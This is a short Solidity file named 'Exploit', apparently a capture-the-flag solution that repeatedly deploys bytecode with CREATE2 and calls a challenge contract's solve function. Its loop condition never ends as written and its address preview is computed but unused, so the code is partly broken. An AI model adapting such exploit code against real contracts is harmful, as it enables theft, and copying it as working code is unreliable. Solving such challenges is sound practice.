// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "./contracts/Setup.sol";

contract Exploit {
    Challenge c;
    
    constructor(address setupc) {
        c = Setup(setupc).challenge();
    }

    function search(uint256 salt, bytes memory code) public {
        bytes32 preview;
        bytes20 addr;
        address deployed;
        bytes memory dead;
        for (salt; salt < salt+100; salt++) {
            preview = keccak256(abi.encodePacked(bytes1(0xff), msg.sender, salt, keccak256(code)));
            // last 20 bytes of the preview
            //addr = bytes20(uint160(uint256(preview)));
            assembly {
                deployed := create2(0, add(code, 0x20), mload(code), salt)
            }
            c.solve(deployed, dead);
        }
    }
}